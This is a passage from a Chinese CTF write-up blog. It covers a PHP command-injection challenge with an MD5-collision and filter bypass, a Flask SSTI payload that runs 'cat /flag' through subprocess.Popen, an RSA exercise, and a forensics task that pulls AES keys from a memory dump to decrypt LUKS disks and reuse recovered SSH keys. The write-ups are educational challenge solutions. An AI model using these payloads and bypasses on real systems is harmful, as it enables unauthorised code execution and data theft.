            <a href="/2020/09/25/BUUOJ%E5%88%B7%E9%A2%98-Web-easy-web/" class="post-title-link" itemprop="url">BUUOJ刷题-Web-easy-web</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2020-09-25 10:14:31 / 修改时间：11:09:30" itemprop="dateCreated datePublished" datetime="2020-09-25T10:14:31+08:00">2020-09-25</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
        </span>
    </span>

  
  
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/2020/09/25/BUUOJ%E5%88%B7%E9%A2%98-Web-easy-web/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2020/09/25/BUUOJ%E5%88%B7%E9%A2%98-Web-easy-web/" itemprop="commentCount"></span>
    </a>
  </span>
  
  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>2.2k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>2 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>安洵杯 2019的easy_web。 上来就是Orange传世名篇（不是，注意URL，<code>http://01247d3a-afa6-47e3-8066-91d9c4cb599a.node3.buuoj.cn/index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=</code>，cmd先不管是啥，img很有意思，两次Base64后再转字符串，得到555.png，那就试着读index.php，得到： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixiï½ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . $txt . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)$_POST[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)$_POST[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5($_POST[<span class="string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure> 很明显，一个RCE。但是要先绕MD5，这个简单，Fastcoll 生成两个文件，Python requests直接提交就行。然后读flag。ls不让用，我们可以dir，发现在/有flag。没法用cat tail head less more等读文件。尝试用man /flag，没装man，这个时候怎么办呢？两种思路：一是继续找有没有其他的命令，这个时候一定要注意去找coreutils有没有神奇的命令，例如xxd sort uniq fmt tarcat paste tac base64 base32 base85等命令。二是用bash绕过。例如，cat /flag，正常ASCII字符前加转义<code>\\</code>，是没有用的。所以，<code>\cat /flag</code>一样可以。注意空格被过滤了，要用%20替换。不过requests自动编码，顺手绕过了。</p>

    <div id="aplayer-TsGstNqE" class="aplayer aplayer-tag-marker meting-tag-marker"
         data-id="2772113" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
    ></div>
<p>flag{742613ae-89e7-4cf2-8ee0-1136024a27b7}</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2020/09/24/Crypto-RSA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/avatar.jpeg">
      <meta itemprop="name" content="Tiaonmmn.ZMZ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tiaonmmn's Littile House">
    </span>

    
    
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/09/24/Crypto-RSA/" class="post-title-link" itemprop="url">Crypto-RSA</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2020-09-24 16:49:20 / 修改时间：16:58:05" itemprop="dateCreated datePublished" datetime="2020-09-24T16:49:20+08:00">2020-09-24</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
        </span>
    </span>

  
  
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/2020/09/24/Crypto-RSA/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2020/09/24/Crypto-RSA/" itemprop="commentCount"></span>
    </a>
  </span>
  
  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>160</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>1 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="rsa基础已知p-q-e求d">RSA基础：已知p q e，求d</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert,mpz</span><br><span class="line">p=mpz(<span class="number">473398607161</span>)</span><br><span class="line">q=mpz(<span class="number">4511491</span>)</span><br><span class="line">e=mpz(<span class="number">17</span>)</span><br><span class="line">d=invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure>

    <div id="aplayer-JuOFHbbN" class="aplayer aplayer-tag-marker meting-tag-marker"
         data-id="3951739" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
    ></div>
<p>flag{08885356-0c68-4d96-8135-121d824e513c}</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2020/09/24/BUUOJ%E5%88%B7%E9%A2%98-Web-Fake-Google/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/avatar.jpeg">
      <meta itemprop="name" content="Tiaonmmn.ZMZ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tiaonmmn's Littile House">
    </span>

    
    
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/09/24/BUUOJ%E5%88%B7%E9%A2%98-Web-Fake-Google/" class="post-title-link" itemprop="url">BUUOJ刷题-Web-Fake-Google</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2020-09-24 14:55:16 / 修改时间：15:23:56" itemprop="dateCreated datePublished" datetime="2020-09-24T14:55:16+08:00">2020-09-24</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
        </span>
    </span>

  
  
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/2020/09/24/BUUOJ%E5%88%B7%E9%A2%98-Web-Fake-Google/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2020/09/24/BUUOJ%E5%88%B7%E9%A2%98-Web-Fake-Google/" itemprop="commentCount"></span>
    </a>
  </span>
  
  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>542</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>1 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>BJDCTF 2nd Fake Google。</p>
<p>页面是个假的Google，输入XXX搜索后返回P3's girlfriend is XXX，输入4返回4，SSTI。</p>
<p>盲猜一个Flask。那就<code>&#123;&#123;config.items()&#125;&#125;</code>，没有flag。然后<code>&#123;&#123;''.\_\_class\_\_.\_\_mro\_\_&#125;&#125;</code>返回(&lt;class 'str'&gt;, &lt;class 'object'&gt;)，那就直接mro.subclasses了：</p>
<p><code>&#123;&#123;''.\_\_class\_\_.\_\_mro\_\_[1].\_\_subclasses\_\_()\[402\](%27cat%20/flag%27,shell=True,stdout=-1).communicate()&#125;&#125;</code></p>
<p>我们找的是subprocess.Popen，要先<code>&#123;&#123;''.\_\_class\_\_.\_\_mro\_\_.\_\_subclasses\_\_&#125;&#125;</code>列所有的子元素，然后找对应下标。</p>

    <div id="aplayer-mxuZIgnI" class="aplayer aplayer-tag-marker meting-tag-marker"
         data-id="22829933" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
    ></div>
<p>flag{0814a99f-6040-4e9b-b42a-e44ce68fab22}</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2020/09/22/DownunderCTF-2020-Forensic-fix-my-pc/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/avatar.jpeg">
      <meta itemprop="name" content="Tiaonmmn.ZMZ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tiaonmmn's Littile House">
    </span>

    
    
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/09/22/DownunderCTF-2020-Forensic-fix-my-pc/" class="post-title-link" itemprop="url">DownunderCTF-Forensic-fix-my-pc</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2020-09-22 17:22:26" itemprop="dateCreated datePublished" datetime="2020-09-22T17:22:26+08:00">2020-09-22</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2020-09-23 11:18:19" itemprop="dateModified" datetime="2020-09-23T11:18:19+08:00">2020-09-23</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
        </span>
    </span>

  
  
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/2020/09/22/DownunderCTF-2020-Forensic-fix-my-pc/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2020/09/22/DownunderCTF-2020-Forensic-fix-my-pc/" itemprop="commentCount"></span>
    </a>
  </span>
  
  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>3.5k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>3 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>Downunder CTF 2020的fix-my-pc，给了个rescue.zip，解压是两个bin。 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file crash.bin</span><br><span class="line">crash.bin: ELF 64-bit LSB core file, x86-64, version 1 (SYSV), SVR4-style</span><br><span class="line">file system.bin</span><br><span class="line">system.bin: QEMU QCOW2 Image (v3), 824634368 bytes</span><br></pre></td></tr></table></figure> crash.bin大概率是个内存镜像。system.bin是个QCOW2镜像，qemu-nbd挂载就OK。 先挂载QCOW2：modprobe nbd;qemu-nbd --connect=/dev/nbd0 system.bin。 然后fdisk -l查看分区信息： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Disk &#x2F;dev&#x2F;nbd0: 786.43 MiB, 824634368 bytes, 1610614 sectors</span><br><span class="line">Units: sectors of 1 * 512 &#x3D; 512 bytes</span><br><span class="line">Sector size (logical&#x2F;physical): 512 bytes &#x2F; 512 bytes</span><br><span class="line">I&#x2F;O size (minimum&#x2F;optimal): 512 bytes &#x2F; 512 bytes</span><br><span class="line">Disklabel type: dos</span><br><span class="line">Disk identifier: 0x00000000</span><br><span class="line"></span><br><span class="line">Device      Boot   Start     End Sectors   Size Id Type</span><br><span class="line">&#x2F;dev&#x2F;nbd0p1           63  204862  204800   100M 83 Linux</span><br><span class="line">&#x2F;dev&#x2F;nbd0p2       204863 1253438 1048576   512M 83 Linux</span><br><span class="line">&#x2F;dev&#x2F;nbd0p3      1253439 1610613  357175 174.4M 83 Linux</span><br></pre></td></tr></table></figure> mount挂载分区，发现nbd0p2和p3不能挂载，分区类型为crypto_LUKS。尝试挂载：modprobe dm-crypt;modprobe dm-mod;cryptsetup open /dev/nbd2 test2，然后要密码。没密码，那就去内存翻。</p>
<p>在去内存找密码之前，先看一下LUKS头信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"># cryptsetup luksDump &#x2F;dev&#x2F;nbd0p2                                                                                                 root@CTFServer-Vindication</span><br><span class="line">LUKS header information</span><br><span class="line">Version:        2</span><br><span class="line">Epoch:          3</span><br><span class="line">Metadata area:  16384 [bytes]</span><br><span class="line">Keyslots area:  16744448 [bytes]</span><br><span class="line">UUID:           d2ed9bec-ef5f-4482-a03c-57c3b3aabcb3</span><br><span class="line">Label:          (no label)</span><br><span class="line">Subsystem:      (no subsystem)</span><br><span class="line">Flags:          (no flags)</span><br><span class="line"></span><br><span class="line">Data segments:</span><br><span class="line">  0: crypt</span><br><span class="line">        offset: 16777216 [bytes]</span><br><span class="line">        length: (whole device)</span><br><span class="line">        cipher: aes-xts-plain64</span><br><span class="line">        sector: 512 [bytes]</span><br><span class="line"></span><br><span class="line">Keyslots:</span><br><span class="line">  0: luks2</span><br><span class="line">        Key:        512 bits</span><br><span class="line">        Priority:   normal</span><br><span class="line">        Cipher:     aes-xts-plain64</span><br><span class="line">        Cipher key: 512 bits</span><br><span class="line">        PBKDF:      argon2i</span><br><span class="line">        Time cost:  13</span><br><span class="line">        Memory:     249470</span><br><span class="line">        Threads:    1</span><br><span class="line">        Salt:       fa 36 bf 79 a9 69 ec f3 6f 49 aa f0 e7 3b e3 03 </span><br><span class="line">                    a4 2b 1f 9b fd a9 8a b6 ca 02 b8 17 d5 ce cf e3 </span><br><span class="line">        AF stripes: 4000</span><br><span class="line">        AF hash:    sha256</span><br><span class="line">        Area offset:32768 [bytes]</span><br><span class="line">        Area length:258048 [bytes]</span><br><span class="line">        Digest ID:  0</span><br><span class="line">Tokens:</span><br><span class="line">Digests:</span><br><span class="line">  0: pbkdf2</span><br><span class="line">        Hash:       sha256</span><br><span class="line">        Iterations: 160627</span><br><span class="line">        Salt:       dc 1a 99 0b f0 b3 c6 bb e5 61 8a f1 41 ff 31 c7 </span><br><span class="line">                    2c 8f d2 b9 7c bf b6 89 d7 20 b9 34 ef ac ae a7 </span><br><span class="line">        Digest:     a0 a2 bb cf e7 27 41 f8 2b e3 df e9 82 c6 c4 f9 </span><br><span class="line">                    98 0f 85 ff 81 e6 e2 cd be f8 0c 3d 33 1a cc 97 </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>用的AES加密。binwalk crash.bin发现是Linux的内存镜像，volatility跑不出来。谷歌搜到了一篇<a target="_blank" rel="noopener" href="https://blog.appsecco.com/breaking-full-disk-encryption-from-a-memory-dump-5a868c4fc81e">这个</a>，试一下findaes工具。跑出来两个AES 256的Key。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Searching &#x2F;home&#x2F;tiaonmmn&#x2F;Challenges_2020_public&#x2F;forensics&#x2F;fix-my-pc&#x2F;crash.bin</span><br><span class="line">Found AES-256 key schedule at offset 0x1bffed68: </span><br><span class="line">ff 98 d7 67 61 14 70 24 eb b0 c8 d4 e1 14 18 14 21 4d 2a 83 d7 93 66 09 37 77 55 e5 18 0a 3c 57 </span><br><span class="line">Found AES-256 key schedule at offset 0x1bffef58: </span><br><span class="line">09 4e 2a df 58 cf b1 7d 85 f0 f6 93 3f 7b 44 ef a0 0a 3c da 7b be 01 87 3e 09 ff 4e e7 a6 05 39</span><br></pre></td></tr></table></figure>
<p>然后参考<a target="_blank" rel="noopener" href="https://unix.stackexchange.com/questions/119803/how-to-decrypt-luks-with-the-known-master-key">这里</a>解密，要注意的是，AES-XTS-Plain64用的是64位密钥，所以要合并上面两段：<code>echo "0 1048576 crypt aes-xts-plain64 094e2adf58cfb17d85f0f6933f7b44efa00a3cda7bbe01873e09ff4ee7a60539ff98d76761147024ebb0c8d4e1141814214d2a83d7936609377755e5180a3c57 0 /dev/nbd0p2 4096" | dmsetup create luks_volume</code>。没有报错，接着挂载：<code>mount /dev/mapper/luks_volume /mnt</code>，得到一个Linux分区，/home没啥东西，/root文件名乱码，直接cat *，得到下面有趣的东西：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;home&#x2F;bob&#x2F;.ash_history </span><br><span class="line">rm .ash_history </span><br><span class="line">shutdown -h now</span><br><span class="line">shutdown</span><br><span class="line">halt</span><br><span class="line">vi &#x2F;etc&#x2F;crypttab</span><br><span class="line">ls</span><br><span class="line">du -h</span><br><span class="line">pwd</span><br><span class="line">ls -la</span><br><span class="line">ls</span><br><span class="line">rm ??b??</span><br><span class="line">cd &#x2F;etc</span><br><span class="line">ls</span><br><span class="line">blkid &gt;&gt; &#x2F;etc&#x2F;crypttab</span><br><span class="line">vim &#x2F;etc&#x2F;crypttab</span><br><span class="line">vi &#x2F;etc&#x2F;crypttab</span><br><span class="line">cd crypttab.d</span><br><span class="line">cd &#x2F;etc&#x2F;crypttab.d</span><br><span class="line">cryptsetup luksOpen &#x2F;dev&#x2F;sda3 crypthome --key-file &#x2F;etc&#x2F;crypttab.d&#x2F;home.key </span><br><span class="line">mount -t ext4 &#x2F;dev&#x2F;sda3 &#x2F;home</span><br><span class="line">ls &#x2F;etc&#x2F;crypttab.d&#x2F;home.key</span><br><span class="line">rc-service sshd start</span><br></pre></td></tr></table></figure>
<p>发现又来一个cryptsetup，我们还有一个分区/dev/nbd0p3没看呢。根据提示，直接解密：<code>cryptsetup luksOpen /dev/nbd0p3 crypthome --key-file /mnt/etc/home.key</code>，<code>mount /dev/mapper/nbd0p3 /mnt1</code>，然后看/mnt1文件，发现有.ssh目录，存在id_rsa id_rsa.pub known_hosts，SSH免密登录。看.ash_history，发现有github的Repo。那就把.ssh目录的文件拷到我们机器上的.ssh目录下，然后git clone git@github.com:cornochips/configs。得到10个file*.txt，但是都没用。git log发现有大量提交日志，一点点翻文件找到了。</p>
<img src="/2020/09/22/DownunderCTF-2020-Forensic-fix-my-pc/git_history.png" class="" title="Git History">

    <div id="aplayer-vaWFSYmn" class="aplayer aplayer-tag-marker meting-tag-marker"
         data-id="424262056" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
    ></div>
<p>flag{548c9969-8cb1-4aef-89fa-4b8548e17b25}</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2020/09/22/DownunderCTF-2020-Web-Taking-stock/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/avatar.jpeg">
      <meta itemprop="name" content="Tiaonmmn.ZMZ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tiaonmmn's Littile House">
    </span>

    
    
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/09/22/DownunderCTF-2020-Web-Taking-stock/" class="post-title-link" itemprop="url">DownunderCTF-Web-Taking-stock</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2020-09-22 09:44:36 / 修改时间：16:18:45" itemprop="dateCreated datePublished" datetime="2020-09-22T09:44:36+08:00">2020-09-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
